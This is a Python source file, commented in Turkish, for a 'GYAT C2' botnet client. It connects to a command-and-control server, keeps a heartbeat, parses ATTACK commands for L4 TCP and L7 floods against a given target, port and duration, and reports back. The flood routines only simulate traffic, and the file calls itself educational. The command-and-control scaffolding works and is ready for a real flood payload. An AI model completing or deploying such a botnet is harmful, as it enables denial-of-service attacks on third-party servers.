import socket
import time
import random
import threading
import sys

# Bu dosya sadece eğitim amaçlıdır ve gerçek saldırılar için kullanılmamalıdır.
# Bu bir bot şablonudur ve GYAT C2 sunucusuna bağlanmak için kullanılır.

class GYATBot:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.connected = False
        self.running = True
        self.current_attack = None
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            self.socket.send("BOT".encode())
            self.connected = True
            print(f"[+] GYAT C2 sunucusuna bağlandı: {self.server_ip}:{self.server_port}")
            return True
        except Exception as e:
            print(f"[-] Bağlantı hatası: {str(e)}")
            return False
    
    def ping(self):
        while self.running and self.connected:
            try:
                self.socket.send("PING".encode())
                response = self.socket.recv(1024).decode()
                if response != "PONG":
                    print("[-] Ping yanıtı alınamadı, yeniden bağlanılıyor...")
                    self.connected = False
                    break
            except:
                print("[-] Ping gönderilirken hata oluştu, yeniden bağlanılıyor...")
                self.connected = False
                break
            time.sleep(10)
    
    def listen_for_commands(self):
        while self.running and self.connected:
            try:
                data = self.socket.recv(1024).decode()
                if not data:
                    print("[-] Sunucu bağlantısı kesildi")
                    self.connected = False
                    break
                
                if data.startswith("ATTACK"):
                    parts = data.split("|")
                    if len(parts) >= 5:
                        attack_type = parts[1]  # L4 veya L7
                        target = parts[2]
                        port = int(parts[3])
                        duration = int(parts[4])
                        
                        print(f"[+] Saldırı komutu alındı: {attack_type} - {target}:{port} - {duration}s")
                        
                        # Saldırı thread'ini başlat
                        if self.current_attack is None:
                            if attack_type == "L4":
                                attack_thread = threading.Thread(target=self.simulate_l4_attack, args=(target, port, duration))
                            else:
                                attack_thread = threading.Thread(target=self.simulate_l7_attack, args=(target, duration))
                            
                            attack_thread.daemon = True
                            attack_thread.start()
                            self.current_attack = attack_thread
                        else:
                            print("[-] Zaten aktif bir saldırı var")
                            self.socket.send("REPORT|BUSY".encode())
            
            except Exception as e:
                print(f"[-] Komut dinlenirken hata oluştu: {str(e)}")
                self.connected = False
                break
    
    def simulate_l4_attack(self, target, port, duration):
        print(f"[*] L4 TCP saldırısı simüle ediliyor: {target}:{port} - {duration}s")
        self.socket.send(f"REPORT|ATTACK_STARTED|L4|{target}:{port}".encode())
        
        start_time = time.time()
        while time.time() - start_time < duration and self.connected:
            # Gerçek bir saldırı yapmıyoruz, sadece simüle ediyoruz
            packets_sent = random.randint(100, 1000)
            print(f"[*] {packets_sent} paket gönderildi simülasyonu: {target}:{port}")
            self.socket.send(f"REPORT|PACKETS|{packets_sent}".encode())
            time.sleep(1)
        
        print(f"[+] L4 saldırısı tamamlandı: {target}:{port}")
        self.socket.send(f"REPORT|ATTACK_COMPLETED|L4|{target}:{port}".encode())
        self.current_attack = None
    
    def simulate_l7_attack(self, target, duration):
        print(f"[*] L7 RAW saldırısı simüle ediliyor: {target} - {duration}s")
        self.socket.send(f"REPORT|ATTACK_STARTED|L7|{target}".encode())
        
        start_time = time.time()
        while time.time() - start_time < duration and self.connected:
            # Gerçek bir saldırı yapmıyoruz, sadece simüle ediyoruz
            requests_sent = random.randint(10, 100)
            print(f"[*] {requests_sent} istek gönderildi simülasyonu: {target}")
            self.socket.send(f"REPORT|REQUESTS|{requests_sent}".encode())
            time.sleep(1)
        
        print(f"[+] L7 saldırısı tamamlandı: {target}")
        self.socket.send(f"REPORT|ATTACK_COMPLETED|L7|{target}".encode())
        self.current_attack = None
    
    def run(self):
        while self.running:
            if not self.connected:
                if self.connect():
                    # Ping thread'ini başlat
                    ping_thread = threading.Thread(target=self.ping)
                    ping_thread.daemon = True
                    ping_thread.start()
                    
                    # Komut dinleme thread'ini başlat
                    self.listen_for_commands()
                else:
                    print("[*] 5 saniye sonra yeniden bağlanmayı dene...")
                    time.sleep(5)
            else:
                time.sleep(1)
    
    def stop(self):
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass

if __name__ == "__main__":
    print("=== GYAT C2 Bot Şablonu ===")
    print("Bu dosya sadece eğitim amaçlıdır ve gerçek saldırılar için kullanılmamalıdır.")
    
    if len(sys.argv) != 3:
        print("Kullanım: python bot_template.py <server_ip> <server_port>")
        print("Örnek: python bot_template.py 127.0.0.1 8080")
        sys.exit(1)
    
    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])
    
    bot = GYATBot(server_ip, server_port)
    
    try:
        bot.run()
    except KeyboardInterrupt:
        print("\n[*] Bot durduruluyor...")
        bot.stop()